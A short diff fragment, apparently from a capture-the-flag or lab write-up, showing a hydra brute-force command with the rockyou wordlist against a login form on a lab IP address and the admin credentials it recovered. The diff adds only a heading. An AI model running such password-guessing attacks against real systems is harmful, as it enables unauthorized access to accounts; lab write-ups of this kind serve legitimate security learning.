@@ -50,3 +50,5 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form 
 ```
 login: admin   password: 1qaz2wsx
 ```
+
+# Acces
